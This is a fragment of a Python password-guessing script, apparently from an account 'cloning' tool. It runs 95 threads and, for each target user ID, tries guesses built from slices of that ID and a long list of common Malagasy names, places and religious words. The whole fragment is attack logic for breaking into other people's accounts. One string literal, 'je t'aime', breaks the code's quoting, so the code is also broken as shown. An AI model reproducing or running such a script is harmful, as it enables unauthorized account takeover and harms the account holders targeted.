...
def BD_CLONING():
    ...
    with tred(max_workers=95) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'amboara','Amboara','sarindra','Sarindra','nilaina','Nilaina','tsilavina','Tsilavina','mamako','Mamako','Nomena','nomena','nirina','Nirina','fitiavana','Fitiavana','fanantenana','Fanantenana','miangola','fahendrena', 'Fahendrena','miangaly','Miangaly','nantenaina','Nantenaina','malala','Malala','Malalako','malalako','randria','Randria','Malagasy','malagasy','razafy','Razafy','tantely','mendrika','Mendrika','mahery','Mahery','fandresena','Fandresena','fiderana','Fiderana','nilaina','Nilaina','deraina','Deraina','tiavina','Tiavina','Bakoly','bakoly','rakoto','Rakoto','tanjona','Tanjona','sandratra','Sandratra','Sambatra','sambatra','Antananarivo','antananarivo','Fenosoa','fenosoa','milely','Milely','tahiry','Tahiry','anjara','Anjara','volana','Volana','je t'aime','Herman','mamiko','Mamiko','safidinirina','agrad','Agrad','olivier','nasandratra','Nasandratra','Safidy','safidy','nomena','Nomena','jesosy','Lafatra','lafatra','jehovah','andriamanitra','Ambohipo','ambohipo','analakely','Analakely','rado','Rado','Nomenhanahary','solofo','Solofo','nomenjanahary','narovana','Narovana','nilaina','Nilaina']
